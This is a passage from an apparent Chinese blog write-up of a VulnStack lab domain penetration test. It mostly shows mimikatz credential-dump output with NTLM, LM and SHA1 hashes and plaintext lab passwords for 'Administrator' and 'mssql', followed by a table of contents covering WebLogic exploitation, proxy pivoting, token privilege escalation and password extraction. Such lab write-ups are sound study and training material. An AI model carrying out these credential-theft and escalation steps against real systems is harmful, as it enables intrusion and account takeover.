class="line">	 * NTLM     : 7b90fe98b4ecc112e6a63567da6e0f32</span><br><span class="line">	 * SHA1     : e778e52157e2e7b485d4a9d9cb1858a8ee3650c8</span><br><span class="line">	tspkg :	</span><br><span class="line">	 * Username : WEB$</span><br><span class="line">	 * Domain   : DE1AY</span><br><span class="line">	 * Password : 63 07 1e bd 74 cd 8f 4d d4 e2 3f 76 39 68 15 a4 1d 17 09 1a 56 0f 5c 0e cc b1 d3 d4 c5 a4 f3 b6 eb 19 6b 49 ad de 2c b7 ab e9 9b 4b 00 0f ca a5 cf 8b a4 84 f3 18 c8 89 b7 64 3b 50 6c 84 99 9c 12 e2 dd df 9f 07 fe 14 c4 48 df 08 34 4c 7e 52 0b e6 45 51 51 54 06 5c 68 04 ae 9b 78 33 e6 ad b1 1e 90 b8 6c 1c 7e 00 7a 1f 8a b4 25 8f fd f1 56 c1 02 ba a2 a9 c1 03 96 46 ac e3 41 a1 0f 17 14 2c 6b 7e c4 f9 f0 01 cf f2 bb 34 e7 44 cc cc db ef 7d a1 d6 f1 7e 85 47 91 d2 09 c3 9c f1 b1 14 66 97 b6 2b 70 67 b8 b2 ce fc 48 75 93 41 a9 d7 13 eb 86 08 ff 9b 20 69 84 4f 94 48 d8 07 d9 dd 74 c4 b4 c9 5c df de c3 1f 0b fe e5 cf 0f dd 74 8d 5c 2b 1c 5c 69 f7 ef ac f4 85 85 cc ec 91 ba 88 d2 07 cc 1d 38 ab d4 df d4 3a a4 0e 08 28 </span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : WEB$</span><br><span class="line">	 * Domain   : DE1AY</span><br><span class="line">	 * Password : 63 07 1e bd 74 cd 8f 4d d4 e2 3f 76 39 68 15 a4 1d 17 09 1a 56 0f 5c 0e cc b1 d3 d4 c5 a4 f3 b6 eb 19 6b 49 ad de 2c b7 ab e9 9b 4b 00 0f ca a5 cf 8b a4 84 f3 18 c8 89 b7 64 3b 50 6c 84 99 9c 12 e2 dd df 9f 07 fe 14 c4 48 df 08 34 4c 7e 52 0b e6 45 51 51 54 06 5c 68 04 ae 9b 78 33 e6 ad b1 1e 90 b8 6c 1c 7e 00 7a 1f 8a b4 25 8f fd f1 56 c1 02 ba a2 a9 c1 03 96 46 ac e3 41 a1 0f 17 14 2c 6b 7e c4 f9 f0 01 cf f2 bb 34 e7 44 cc cc db ef 7d a1 d6 f1 7e 85 47 91 d2 09 c3 9c f1 b1 14 66 97 b6 2b 70 67 b8 b2 ce fc 48 75 93 41 a9 d7 13 eb 86 08 ff 9b 20 69 84 4f 94 48 d8 07 d9 dd 74 c4 b4 c9 5c df de c3 1f 0b fe e5 cf 0f dd 74 8d 5c 2b 1c 5c 69 f7 ef ac f4 85 85 cc ec 91 ba 88 d2 07 cc 1d 38 ab d4 df d4 3a a4 0e 08 28 </span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : WEB$</span><br><span class="line">	 * Domain   : de1ay.com</span><br><span class="line">	 * Password : 63 07 1e bd 74 cd 8f 4d d4 e2 3f 76 39 68 15 a4 1d 17 09 1a 56 0f 5c 0e cc b1 d3 d4 c5 a4 f3 b6 eb 19 6b 49 ad de 2c b7 ab e9 9b 4b 00 0f ca a5 cf 8b a4 84 f3 18 c8 89 b7 64 3b 50 6c 84 99 9c 12 e2 dd df 9f 07 fe 14 c4 48 df 08 34 4c 7e 52 0b e6 45 51 51 54 06 5c 68 04 ae 9b 78 33 e6 ad b1 1e 90 b8 6c 1c 7e 00 7a 1f 8a b4 25 8f fd f1 56 c1 02 ba a2 a9 c1 03 96 46 ac e3 41 a1 0f 17 14 2c 6b 7e c4 f9 f0 01 cf f2 bb 34 e7 44 cc cc db ef 7d a1 d6 f1 7e 85 47 91 d2 09 c3 9c f1 b1 14 66 97 b6 2b 70 67 b8 b2 ce fc 48 75 93 41 a9 d7 13 eb 86 08 ff 9b 20 69 84 4f 94 48 d8 07 d9 dd 74 c4 b4 c9 5c df de c3 1f 0b fe e5 cf 0f dd 74 8d 5c 2b 1c 5c 69 f7 ef ac f4 85 85 cc ec 91 ba 88 d2 07 cc 1d 38 ab d4 df d4 3a a4 0e 08 28 </span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 619780 (00000000:00097504)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : mssql</span><br><span class="line">Domain            : DE1AY</span><br><span class="line">Logon Server      : DC</span><br><span class="line">Logon Time        : 2019/12/13 10:16:28</span><br><span class="line">SID               : S-1-5-21-2756371121-2868759905-3853650604-2103</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : mssql</span><br><span class="line">	 * Domain   : DE1AY</span><br><span class="line">	 * LM       : f67ce55ac831223dc187b8085fe1d9df</span><br><span class="line">	 * NTLM     : 161cff084477fe596a5db81874498a24</span><br><span class="line">	 * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d</span><br><span class="line">	tspkg :	</span><br><span class="line">	 * Username : mssql</span><br><span class="line">	 * Domain   : DE1AY</span><br><span class="line">	 * Password : 1qaz@WSX</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : mssql</span><br><span class="line">	 * Domain   : DE1AY</span><br><span class="line">	 * Password : 1qaz@WSX</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : mssql</span><br><span class="line">	 * Domain   : DE1AY.COM</span><br><span class="line">	 * Password : 1qaz@WSX</span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 167050 (00000000:00028c8a)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : mssql</span><br><span class="line">Domain            : DE1AY</span><br><span class="line">Logon Server      : DC</span><br><span class="line">Logon Time        : 2019/12/13 10:15:23</span><br><span class="line">SID               : S-1-5-21-2756371121-2868759905-3853650604-2103</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : mssql</span><br><span class="line">	 * Domain   : DE1AY</span><br><span class="line">	 * LM       : f67ce55ac831223dc187b8085fe1d9df</span><br><span class="line">	 * NTLM     : 161cff084477fe596a5db81874498a24</span><br><span class="line">	 * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d</span><br><span class="line">	tspkg :	</span><br><span class="line">	 * Username : mssql</span><br><span class="line">	 * Domain   : DE1AY</span><br><span class="line">	 * Password : 1qaz@WSX</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : mssql</span><br><span class="line">	 * Domain   : DE1AY</span><br><span class="line">	 * Password : 1qaz@WSX</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : mssql</span><br><span class="line">	 * Domain   : DE1AY.COM</span><br><span class="line">	 * Password : 1qaz@WSX</span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : WEB$</span><br><span class="line">Domain            : DE1AY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2019/12/13 10:15:08</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : WEB$</span><br><span class="line">	 * Domain   : DE1AY</span><br><span class="line">	 * NTLM     : 7b90fe98b4ecc112e6a63567da6e0f32</span><br><span class="line">	 * SHA1     : e778e52157e2e7b485d4a9d9cb1858a8ee3650c8</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : WEB$</span><br><span class="line">	 * Domain   : DE1AY</span><br><span class="line">	 * Password : 63 07 1e bd 74 cd 8f 4d d4 e2 3f 76 39 68 15 a4 1d 17 09 1a 56 0f 5c 0e cc b1 d3 d4 c5 a4 f3 b6 eb 19 6b 49 ad de 2c b7 ab e9 9b 4b 00 0f ca a5 cf 8b a4 84 f3 18 c8 89 b7 64 3b 50 6c 84 99 9c 12 e2 dd df 9f 07 fe 14 c4 48 df 08 34 4c 7e 52 0b e6 45 51 51 54 06 5c 68 04 ae 9b 78 33 e6 ad b1 1e 90 b8 6c 1c 7e 00 7a 1f 8a b4 25 8f fd f1 56 c1 02 ba a2 a9 c1 03 96 46 ac e3 41 a1 0f 17 14 2c 6b 7e c4 f9 f0 01 cf f2 bb 34 e7 44 cc cc db ef 7d a1 d6 f1 7e 85 47 91 d2 09 c3 9c f1 b1 14 66 97 b6 2b 70 67 b8 b2 ce fc 48 75 93 41 a9 d7 13 eb 86 08 ff 9b 20 69 84 4f 94 48 d8 07 d9 dd 74 c4 b4 c9 5c df de c3 1f 0b fe e5 cf 0f dd 74 8d 5c 2b 1c 5c 69 f7 ef ac f4 85 85 cc ec 91 ba 88 d2 07 cc 1d 38 ab d4 df d4 3a a4 0e 08 28 </span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : web$</span><br><span class="line">	 * Domain   : DE1AY.COM</span><br><span class="line">	 * Password : 63 07 1e bd 74 cd 8f 4d d4 e2 3f 76 39 68 15 a4 1d 17 09 1a 56 0f 5c 0e cc b1 d3 d4 c5 a4 f3 b6 eb 19 6b 49 ad de 2c b7 ab e9 9b 4b 00 0f ca a5 cf 8b a4 84 f3 18 c8 89 b7 64 3b 50 6c 84 99 9c 12 e2 dd df 9f 07 fe 14 c4 48 df 08 34 4c 7e 52 0b e6 45 51 51 54 06 5c 68 04 ae 9b 78 33 e6 ad b1 1e 90 b8 6c 1c 7e 00 7a 1f 8a b4 25 8f fd f1 56 c1 02 ba a2 a9 c1 03 96 46 ac e3 41 a1 0f 17 14 2c 6b 7e c4 f9 f0 01 cf f2 bb 34 e7 44 cc cc db ef 7d a1 d6 f1 7e 85 47 91 d2 09 c3 9c f1 b1 14 66 97 b6 2b 70 67 b8 b2 ce fc 48 75 93 41 a9 d7 13 eb 86 08 ff 9b 20 69 84 4f 94 48 d8 07 d9 dd 74 c4 b4 c9 5c df de c3 1f 0b fe e5 cf 0f dd 74 8d 5c 2b 1c 5c 69 f7 ef ac f4 85 85 cc ec 91 ba 88 d2 07 cc 1d 38 ab d4 df d4 3a a4 0e 08 28 </span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 57022 (00000000:0000debe)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2019/12/13 10:15:07</span><br><span class="line">SID               : </span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : WEB$</span><br><span class="line">	 * Domain   : DE1AY</span><br><span class="line">	 * NTLM     : 7b90fe98b4ecc112e6a63567da6e0f32</span><br><span class="line">	 * SHA1     : e778e52157e2e7b485d4a9d9cb1858a8ee3650c8</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	kerberos :	</span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 4712679 (00000000:0047e8e7)</span><br><span class="line">Session           : CachedInteractive from 1</span><br><span class="line">User Name         : Administrator</span><br><span class="line">Domain            : DE1AY</span><br><span class="line">Logon Server      : DC</span><br><span class="line">Logon Time        : 2019/12/13 11:37:18</span><br><span class="line">SID               : S-1-5-21-2756371121-2868759905-3853650604-500</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : Administrator</span><br><span class="line">	 * Domain   : DE1AY</span><br><span class="line">	 * LM       : f67ce55ac831223dc187b8085fe1d9df</span><br><span class="line">	 * NTLM     : 161cff084477fe596a5db81874498a24</span><br><span class="line">	 * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d</span><br><span class="line">	tspkg :	</span><br><span class="line">	 * Username : Administrator</span><br><span class="line">	 * Domain   : DE1AY</span><br><span class="line">	 * Password : 1qaz@WSX</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : Administrator</span><br><span class="line">	 * Domain   : DE1AY</span><br><span class="line">	 * Password : 1qaz@WSX</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : Administrator</span><br><span class="line">	 * Domain   : de1ay.com</span><br><span class="line">	 * Password : 1qaz@WSX</span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 1197903 (00000000:0012474f)</span><br><span class="line">Session           : CachedInteractive from 1</span><br><span class="line">User Name         : Administrator</span><br><span class="line">Domain            : DE1AY</span><br><span class="line">Logon Server      : DC</span><br><span class="line">Logon Time        : 2019/12/13 10:17:53</span><br><span class="line">SID               : S-1-5-21-2756371121-2868759905-3853650604-500</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : Administrator</span><br><span class="line">	 * Domain   : DE1AY</span><br><span class="line">	 * LM       : f67ce55ac831223dc187b8085fe1d9df</span><br><span class="line">	 * NTLM     : 161cff084477fe596a5db81874498a24</span><br><span class="line">	 * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d</span><br><span class="line">	tspkg :	</span><br><span class="line">	 * Username : Administrator</span><br><span class="line">	 * Domain   : DE1AY</span><br><span class="line">	 * Password : 1qaz@WSX</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : Administrator</span><br><span class="line">	 * Domain   : DE1AY</span><br><span class="line">	 * Password : 1qaz@WSX</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : Administrator</span><br><span class="line">	 * Domain   : de1ay.com</span><br><span class="line">	 * Password : 1qaz@WSX</span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 768297 (00000000:000bb929)</span><br><span class="line">Session           : CachedInteractive from 1</span><br><span class="line">User Name         : Administrator</span><br><span class="line">Domain            : DE1AY</span><br><span class="line">Logon Server      : DC</span><br><span class="line">Logon Time        : 2019/12/13 10:16:42</span><br><span class="line">SID               : S-1-5-21-2756371121-2868759905-3853650604-500</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : Administrator</span><br><span class="line">	 * Domain   : DE1AY</span><br><span class="line">	 * LM       : f67ce55ac831223dc187b8085fe1d9df</span><br><span class="line">	 * NTLM     : 161cff084477fe596a5db81874498a24</span><br><span class="line">	 * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d</span><br><span class="line">	tspkg :	</span><br><span class="line">	 * Username : Administrator</span><br><span class="line">	 * Domain   : DE1AY</span><br><span class="line">	 * Password : 1qaz@WSX</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : Administrator</span><br><span class="line">	 * Domain   : DE1AY</span><br><span class="line">	 * Password : 1qaz@WSX</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : Administrator</span><br><span class="line">	 * Domain   : de1ay.com</span><br><span class="line">	 * Password : 1qaz@WSX</span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 995 (00000000:000003e3)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : IUSR</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2019/12/13 10:15:49</span><br><span class="line">SID               : S-1-5-17</span><br><span class="line">	msv :	</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : (null)</span><br><span class="line">	 * Domain   : (null)</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 141665 (00000000:00022961)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : mssql</span><br><span class="line">Domain            : DE1AY</span><br><span class="line">Logon Server      : DC</span><br><span class="line">Logon Time        : 2019/12/13 10:15:21</span><br><span class="line">SID               : S-1-5-21-2756371121-2868759905-3853650604-2103</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : mssql</span><br><span class="line">	 * Domain   : DE1AY</span><br><span class="line">	 * LM       : f67ce55ac831223dc187b8085fe1d9df</span><br><span class="line">	 * NTLM     : 161cff084477fe596a5db81874498a24</span><br><span class="line">	 * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d</span><br><span class="line">	tspkg :	</span><br><span class="line">	 * Username : mssql</span><br><span class="line">	 * Domain   : DE1AY</span><br><span class="line">	 * Password : 1qaz@WSX</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : mssql</span><br><span class="line">	 * Domain   : DE1AY</span><br><span class="line">	 * Password : 1qaz@WSX</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : mssql</span><br><span class="line">	 * Domain   : DE1AY.COM</span><br><span class="line">	 * Password : 1qaz@WSX</span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2019/12/13 10:15:08</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">	msv :	</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : (null)</span><br><span class="line">	 * Domain   : (null)</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : (null)</span><br><span class="line">	 * Domain   : (null)</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : WEB$</span><br><span class="line">Domain            : DE1AY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2019/12/13 10:15:07</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line">	msv :	</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : WEB$</span><br><span class="line">	 * Domain   : DE1AY</span><br><span class="line">	 * Password : 63 07 1e bd 74 cd 8f 4d d4 e2 3f 76 39 68 15 a4 1d 17 09 1a 56 0f 5c 0e cc b1 d3 d4 c5 a4 f3 b6 eb 19 6b 49 ad de 2c b7 ab e9 9b 4b 00 0f ca a5 cf 8b a4 84 f3 18 c8 89 b7 64 3b 50 6c 84 99 9c 12 e2 dd df 9f 07 fe 14 c4 48 df 08 34 4c 7e 52 0b e6 45 51 51 54 06 5c 68 04 ae 9b 78 33 e6 ad b1 1e 90 b8 6c 1c 7e 00 7a 1f 8a b4 25 8f fd f1 56 c1 02 ba a2 a9 c1 03 96 46 ac e3 41 a1 0f 17 14 2c 6b 7e c4 f9 f0 01 cf f2 bb 34 e7 44 cc cc db ef 7d a1 d6 f1 7e 85 47 91 d2 09 c3 9c f1 b1 14 66 97 b6 2b 70 67 b8 b2 ce fc 48 75 93 41 a9 d7 13 eb 86 08 ff 9b 20 69 84 4f 94 48 d8 07 d9 dd 74 c4 b4 c9 5c df de c3 1f 0b fe e5 cf 0f dd 74 8d 5c 2b 1c 5c 69 f7 ef ac f4 85 85 cc ec 91 ba 88 d2 07 cc 1d 38 ab d4 df d4 3a a4 0e 08 28 </span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : web$</span><br><span class="line">	 * Domain   : DE1AY.COM</span><br><span class="line">	 * Password : 63 07 1e bd 74 cd 8f 4d d4 e2 3f 76 39 68 15 a4 1d 17 09 1a 56 0f 5c 0e cc b1 d3 d4 c5 a4 f3 b6 eb 19 6b 49 ad de 2c b7 ab e9 9b 4b 00 0f ca a5 cf 8b a4 84 f3 18 c8 89 b7 64 3b 50 6c 84 99 9c 12 e2 dd df 9f 07 fe 14 c4 48 df 08 34 4c 7e 52 0b e6 45 51 51 54 06 5c 68 04 ae 9b 78 33 e6 ad b1 1e 90 b8 6c 1c 7e 00 7a 1f 8a b4 25 8f fd f1 56 c1 02 ba a2 a9 c1 03 96 46 ac e3 41 a1 0f 17 14 2c 6b 7e c4 f9 f0 01 cf f2 bb 34 e7 44 cc cc db ef 7d a1 d6 f1 7e 85 47 91 d2 09 c3 9c f1 b1 14 66 97 b6 2b 70 67 b8 b2 ce fc 48 75 93 41 a9 d7 13 eb 86 08 ff 9b 20 69 84 4f 94 48 d8 07 d9 dd 74 c4 b4 c9 5c df de c3 1f 0b fe e5 cf 0f dd 74 8d 5c 2b 1c 5c 69 f7 ef ac f4 85 85 cc ec 91 ba 88 d2 07 cc 1d 38 ab d4 df d4 3a a4 0e 08 28 </span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # exit</span><br><span class="line">Bye!</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2019/12/11/VulnStack域环境靶场渗透/" title="VulnStack域环境靶场渗透">https://wh0ale.github.io/2019/12/11/VulnStack域环境靶场渗透/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2019/12/04/waf从入门到Bypass/" rel="next" title="waf从入门到Bypass">
+                <i class="fa fa-chevron-left"></i> waf从入门到Bypass
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">124</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        
+        
+          
+        
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">60</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#环境配置"><span class="nav-number">1.</span> <span class="nav-text">环境配置</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#cve-2019-2725"><span class="nav-number">2.</span> <span class="nav-text">cve-2019-2725</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#后渗透"><span class="nav-number">3.</span> <span class="nav-text">后渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#信息收集"><span class="nav-number">3.1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基本命令"><span class="nav-number">3.1.1.</span> <span class="nav-text">基本命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#定位域控"><span class="nav-number">3.1.2.</span> <span class="nav-text">定位域控</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#proxy"><span class="nav-number">3.2.</span> <span class="nav-text">proxy</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#http代理转发"><span class="nav-number">3.2.1.</span> <span class="nav-text">http代理转发</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#metasploit-proxychains"><span class="nav-number">3.2.2.</span> <span class="nav-text">metasploit+proxychains</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cobalt-Strike-socks代理"><span class="nav-number">3.2.3.</span> <span class="nav-text">Cobalt Strike socks代理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#提权"><span class="nav-number">3.3.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Metasploit中的incognito"><span class="nav-number">3.3.1.</span> <span class="nav-text">Metasploit中的incognito</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows中的incognito"><span class="nav-number">3.3.2.</span> <span class="nav-text">Windows中的incognito</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Invoke-TokenManipulation-ps1用法"><span class="nav-number">3.3.3.</span> <span class="nav-text">Invoke-TokenManipulation.ps1用法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用token获得TrustedInstaller权限"><span class="nav-number">3.3.4.</span> <span class="nav-text">利用token获得TrustedInstaller权限</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#密码读取"><span class="nav-number">3.4.</span> <span class="nav-text">密码读取</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#NTML-Hash"><span class="nav-number">3.4.1.</span> <span class="nav-text">NTML-Hash</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#本地获取"><span class="nav-number">3.4.1.1.</span> <span class="nav-text">本地获取</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" 